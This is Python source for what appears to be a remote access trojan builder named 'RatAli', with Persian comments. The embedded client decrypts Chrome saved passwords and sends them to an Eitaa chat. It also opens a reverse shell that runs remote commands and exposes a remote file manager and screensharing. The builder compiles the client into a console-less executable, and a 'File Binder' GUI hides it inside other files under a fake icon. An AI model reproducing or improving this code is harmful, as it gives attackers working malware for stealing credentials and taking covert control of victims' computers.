            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for login in cursor.fetchall():
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        message = f"URL: {{url}}\\nUser Name: {{username}}\\nPassword: {{decrypted_password}}"
                        send_to_eita(message)
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        client_socket.send("finished".encode())
    except Exception:
        client_socket.send("finished".encode())

def get_file_list(directory):
    try:
        files = []
        for item in os.listdir(directory):
            path = os.path.join(directory, item)
            files.append({{
                'name': item,
                'path': path,
                'is_dir': os.path.isdir(path),
                'size': os.path.getsize(path) if not os.path.isdir(path) else 0
            }})
        return files
    except Exception:
        return []

def read_file(file_path):
    try:
        binary_extensions = {{'.exe', '.bin', '.jpg', '.png', '.mp4'}}
        if os.path.splitext(file_path)[1].lower() in binary_extensions:
            return "Binary file cannot be read as text."
        encodings = ['utf-8', 'windows-1252', 'latin1']
        for encoding in encodings:
            try:
                with open(file_path, 'r', encoding=encoding) as f:
                    return f.read()
            except UnicodeDecodeError:
                continue
        return "Unable to decode file with supported encodings."
    except Exception:
        return ""

def file_client_main(server_host, file_port):
    global file_active
    file_socket = None
    while True:
        try:
            file_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            file_socket.bind(('', FILE_PORT))  # گوش دادن به پورت محلی
            file_socket.listen(1)
            print(f"File client listening on port {FILE_PORT}")
            conn, addr = file_socket.accept()
            print(f"File client accepted connection from {{addr}}")
            file_active = True
            while file_active:
                command = conn.recv(1024).decode('utf-8')
                if not command or command == "STOP_FILE":
                    file_active = False
                    break
                if command == "LIST":
                    dir_path = conn.recv(1024).decode('utf-8')
                    file_list = get_file_list(dir_path)
                    json_data = json.dumps(file_list).encode('utf-8')
                    conn.sendall(str(len(json_data)).encode('utf-8') + b'\\n')
                    conn.sendall(json_data)
                elif command == "DOWNLOAD":
                    file_path = conn.recv(1024).decode('utf-8')
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                        conn.sendall(str(len(file_data)).encode('utf-8') + b'\\n')
                        conn.sendall(file_data)
                elif command == "UPLOAD":
                    file_name = conn.recv(1024).decode('utf-8')
                    size = int(conn.recv(1024).decode('utf-8').split('\\n')[0])
                    data = b""
                    while len(data) < size:
                        data += conn.recv(min(size - len(data), 4096))
                    with open(file_name, 'wb') as f:
                        f.write(data)
                    conn.sendall(b"Upload complete")
                elif command == "DELETE":
                    file_path = conn.recv(1024).decode('utf-8')
                    if os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                    else:
                        os.remove(file_path)
                    conn.sendall(b"Deleted")
                elif command == "CREATE_DIR":
                    dir_path = conn.recv(1024).decode('utf-8')
                    os.makedirs(dir_path, exist_ok=True)
                    conn.sendall(b"Directory created")
                elif command == "RENAME":
                    data = json.loads(conn.recv(1024).decode('utf-8'))
                    os.rename(data['old_path'], data['new_path'])
                    conn.sendall(b"Renamed")
                elif command == "COPY":
                    data = json.loads(conn.recv(1024).decode('utf-8'))
                    if os.path.isdir(data['src']):
                        shutil.copytree(data['src'], data['dst'])
                    else:
                        shutil.copy2(data['src'], data['dst'])
                    conn.sendall(b"Copied")
                elif command == "MOVE":
                    data = json.loads(conn.recv(1024).decode('utf-8'))
                    shutil.move(data['src'], data['dst'])
                    conn.sendall(b"Moved")
                elif command == "READ":
                    file_path = conn.recv(1024).decode('utf-8')
                    content = read_file(file_path)
                    content_data = content.encode('utf-8')
                    conn.sendall(str(len(content_data)).encode('utf-8') + b'\\n')
                    conn.sendall(content_data)
            conn.close()
        except Exception as e:
            print(f"File client error: {{e}}")
            time.sleep(2)
        finally:
            if file_socket:
                file_socket.close()

def shell_client_main(server_host, server_port):
    global remote_active, file_active
    threading.Thread(target=file_client_main, args=(server_host, FILE_PORT), daemon=True).start()
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_host, server_port))
            print(f"Connected to server {{server_host}}:{{server_port}}")
            while True:
                current_dir = os.getcwd()
                client_socket.send(current_dir.encode())
                command = client_socket.recv(1024).decode().strip()
                if not command:
                    break
                if command.lower() == 'exit':
                    break
                if command.lower() == 'screenshare':
                    if not remote_active:
                        start_remote_desktop()
                        client_socket.send("Screenshare started.".encode())
                    else:
                        client_socket.send("Screenshare is already active.".encode())
                    continue
                if command.lower() == 'stop':
                    if remote_active:
                        stop_remote_desktop()
                        client_socket.send("Screenshare stopped.".encode())
                    else:
                        client_socket.send("Screenshare is not active.".encode())
                    continue
                if command.lower() == 'passwdext':
                    threading.Thread(target=extract_passwords, args=(client_socket,), daemon=True).start()
                    continue
                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        response = f"Changed directory to {{os.getcwd()}}"
                    except Exception as e:
                        response = f"Error: {{e}}"
                    client_socket.send(response.encode())
                    continue

                try:
                    if command.startswith("cmd /k runas"):
                        process = subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        stdout, stderr = process.communicate(timeout=10)
                        response = stdout + stderr
                        if not response:
                            response = "Command executed with new console."
                    else:
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        stdout, stderr = process.communicate(timeout=10)
                        response = stdout + stderr
                        if not response:
                            response = "Command executed successfully."
                except subprocess.TimeoutExpired:
                    response = "Error: Command execution timed out."
                except Exception as e:
                    response = f"Error: {{e}}"

                client_socket.send(response.encode())
        except ConnectionRefusedError:
            time.sleep(5)
        except ConnectionResetError:
            time.sleep(5)
        except Exception as e:
            print(f"Error in shell client: {{e}}")
            time.sleep(5)
        finally:
            client_socket.close()

if __name__ == "__main__":
    shell_client_main(DEFAULT_HOST, SHELL_PORT)
"""

    script_name = f"{client_name}.py"
    with open(script_name, "w", encoding='utf-8') as f:
        f.write(client_code)

    try:
        subprocess.run(['pyinstaller', '--noconsole', '--onefile', script_name], check=True)
        print(f"Client {client_name}.exe created successfully in dist folder.")
        logging.info(f"Client {client_name}.exe created successfully.")
        return f"dist/{client_name}.exe"
    except subprocess.CalledProcessError as e:
        print(f"Error creating executable: {e}")
        logging.error(f"Error creating executable for {client_name}: {e}")
        return None

def create_new_client():
    global SHELL_PORT
    print("Creating new client...")
    client_name = input("Enter client name (e.g., client1): ")
    ip = input("Enter IP address for shell: ")
    shell_port = int(input("Enter shell port: "))
    default_key = input("Enter DEFAULT_KEY for remote: ")
    token = input("Enter Eitaa TOKEN: ")
    chat_id = input("Enter Eitaa CHAT_ID: ")

    if shell_port != SHELL_PORT:
        change_listening_port(shell_port)

    client_exe_path = create_new_client_with_params(client_name, ip, shell_port, default_key, token, chat_id)
    return client_exe_path

# ------------------- بخش File Binder -------------------
def bind_files(save_location, FILE_ICON):
    files = window.files
    file_encoded = []
    for file in files:
        with open(file, "rb") as f:
            file_encoded.append(base64.b64encode(f.read()))

    file_structure = """
import os
import base64
temp = os.getenv("TEMP")
os.chdir(temp)
"""
    random_file_ints = []
    file_exts = []
    for file in files:
        f_split = file.split(".")[-1]
        file_exts.append(f_split if f_split != file else None)

    script = file_structure
    for index, file_e in enumerate(file_encoded):
        script += f"file{index} = {file_e}\n"
    for _ in range(len(files)):
        r = random.randint(69, 6969)
        random_file_ints.append(r)
    for x in range(len(files)):
        if file_exts[x]:
            script += f"""
with open('{random_file_ints[x]}.{file_exts[x]}', 'wb') as f:
    f.write(base64.b64decode(file{x}))
    f.close()
"""
        else:
            script += f"""
with open('{random_file_ints[x]}', 'wb') as f:
    f.write(base64.b64decode(file{x}))
    f.close()
"""
    for z in range(len(files)):
        if file_exts[z]:
            script += f'os.startfile(f"{{temp}}\\\\{random_file_ints[z]}.{file_exts[z]}")\n'
        else:
            script += f'os.startfile(f"{{temp}}\\\\{random_file_ints[z]}")\n'

    with open("Out.py", "w") as o:
        o.write(script)

    file_name = os.path.splitext(save_location.split("/")[-1])[0]
    file_path = os.path.dirname(save_location) or os.getcwd()

    if FILE_ICON:
        command = (
            f'pyinstaller --onefile --noconsole --icon="{FILE_ICON}" --distpath "{file_path}" '
            f'--workpath "{os.getcwd()}" --name "{file_name}" Out.py && rmdir /S /Q build && del {file_name}.spec'
        )
    else:
        command = (
            f'pyinstaller --onefile --noconsole --icon=NONE --distpath "{file_path}" '
            f'--workpath "{os.getcwd()}" --name "{file_name}" Out.py && rmdir /S /Q build && del {file_name}.spec'
        )
    os.system(command)
    os.remove("Out.py")

class FileBinderGUI(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.save_location = os.getcwd().replace("\\", "/")
        self.icon = None
        self.files = []

        self.setWindowTitle("Simple File Binder - By RatAli")
        self.setAcceptDrops(True)
        self.resize(700, 400)

        self.list_widget = QtWidgets.QListWidget()
        self.list_widget.setDragDropMode(QtWidgets.QAbstractItemView.InternalMove)
        self.list_widget.setSelectionMode(QtWidgets.QAbstractItemView.ExtendedSelection)

        self.bind_button = QtWidgets.QPushButton("Bind")
        self.bind_button.clicked.connect(self.bind_button_clicked)

        self.select_icon_button = QtWidgets.QPushButton("Select Icon")
        self.select_icon_button.clicked.connect(self.select_icon)

        layout = QtWidgets.QVBoxLayout()
        layout.addWidget(self.list_widget)
        layout.addWidget(self.select_icon_button)
        layout.addWidget(self.bind_button)
        self.setLayout(layout)

        self.create_context_menu()

    def select_icon(self):
        FILE_ICON = fd.askopenfilename(filetypes=[("Icon Files", "*.ico"), ("PNG Files", "*.png"), ("JPEG Files", "*.jpg")])
        print(FILE_ICON)
        self.icon = FILE_ICON

    def bind_button_clicked(self):
        if not self.files:
            QtWidgets.QMessageBox.question(None, "Error", "No Files In Binder", QtWidgets.QMessageBox.Ok)
        elif len(self.files) == 1:
            QtWidgets.QMessageBox.question(None, "Error", "No Other Files To Bind", QtWidgets.QMessageBox.Ok)
        else:
            f = fd.asksaveasfilename(initialfile='Binded.exe', defaultextension=".exe", filetypes=[("Executable", "*.exe")])
            if not f:
                print("Canceled")
                return
            else:
                self.save_location = f
                print(self.save_location)
            self.bind_button.setEnabled(False)
            self.show_progress_dialog()

    def show_progress_dialog(self):
        global bind_progress_dialog
        bind_progress_dialog = QtWidgets.QProgressDialog("Binding files...", None, 0, 0, self)
        bind_progress_dialog.setWindowTitle("Binding")
        bind_progress_dialog.setWindowModality(QtCore.Qt.WindowModal)
        bind_progress_dialog.show()

        bind_files_thread = threading.Thread(target=partial(self.bind_files_async, self.save_location, self.icon), daemon=True)
        bind_files_thread.start()

    def bind_files_async(self, save_location, FILE_ICON):
        bind_files(save_location, FILE_ICON)
        QtCore.QTimer.singleShot(0, self.on_binding_complete)

    def on_binding_complete(self):
        bind_progress_dialog.deleteLater()
        QtWidgets.QMessageBox.information(self, "Info", "Files binding complete.")
        self.bind_button.setEnabled(True)
        QtWidgets.QApplication.quit()

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls():
            event.acceptProposedAction()

    def dragMoveEvent(self, event):
        if event.mimeData().hasUrls():
            event.acceptProposedAction()

    def dropEvent(self, event):
        if event.mimeData().hasUrls():
            urls = event.mimeData().urls()
            for url in urls:
                file_path = url.toLocalFile()
                if file_path:
                    self.files.append(file_path)
                    self.list_widget.addItem(Path(file_path).name)

    def create_context_menu(self):
        self.list_widget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.list_widget.customContextMenuRequested.connect(self.show_context_menu)
        self.context_menu = QtWidgets.QMenu(self)
        delete_action = self.context_menu.addAction("Delete")
        delete_action.triggered.connect(self.delete_selected_items)

    def show_context_menu(self, position):
        self.context_menu.exec_(self.list_widget.mapToGlobal(position))

    def delete_selected_items(self):
        selected_items = self.list_widget.selectedItems()
        for item in selected_items:
            index = self.list_widget.row(item)
            self.list_widget.takeItem(index)
            file_path = self.files.pop(index)
            print("Deleted file:", file_path)

    def closeEvent(self, event):
        reply = QtWidgets.QMessageBox.question(
            self, "Exit", "Are you sure you want to exit?",
            QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No
        )
        if reply == QtWidgets.QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

def execute_bind_command(command=None):
    if command and "-bind" in command:
        pass
    else:
        app = QtWidgets.QApplication(sys.argv)
        global window
        window = FileBinderGUI()
        window.show()
        app.exec_()

# ------------------- بخش راهنما و حلقه اصلی -------------------
def show_help():
    print("""
Available commands:
  shell <name>    - Connect to a specific client (e.g., shell shellsys_1)
  cnc             - Create a new client
  listen <port>   - Change listening port manually
  list            - List connected clients
  bind            - Open GUI to bind EXE and PNG,EXE,JPG... files
  crypt           - Open GUI to encrypt an EXE file
  rfe             - Start Remote File Explorer for the active client
  stop_file       - Stop Remote File Explorer
  clear           - Clear the server console
  help            - Show this help message
  exit            - Exit the server
""")

def main_loop():
    while True:
        command = input("RatAli> ").strip()
        if command.startswith("shell "):
            client_name = command.split(" ")[1]
            if client_name in clients and not clients[client_name]['active']:
                clients[client_name]['active'] = True
                print(f"Connecting to {client_name}...")
                interact_with_client(client_name, clients[client_name]['socket'])
            else:
                print(f"Client {client_name} not found or already active.")
        elif command.lower() == "cnc":
            create_new_client()
        elif command.startswith("listen "):
            try:
                new_port = int(command.split(" ")[1])
                change_listening_port(new_port)
            except ValueError:
                print("Error: Port must be a number.")
        elif command.lower() == "list":
            print("Connected clients:")
            for name in clients:
                status = "Active" if clients[name]['active'] else "Inactive"
                print(f"{name} - {status}")
        elif command.lower().startswith("bind"):
            execute_bind_command(command)
        elif command.lower() == "crypt":
            execute_crypt_command()
        elif command.lower() == "clear":
            os.system("cls" if os.name == "nt" else "clear")
        elif command.lower() == "help":
            show_help()
        elif command.lower() == "exit":
            break
        else:
            print("Error: Please enter 'help' for assistance.")

if __name__ == "__main__":
    listening_thread = threading.Thread(target=start_shell_server, args=(SHELL_PORT,), daemon=True)
    listening_thread.start()
    main_loop()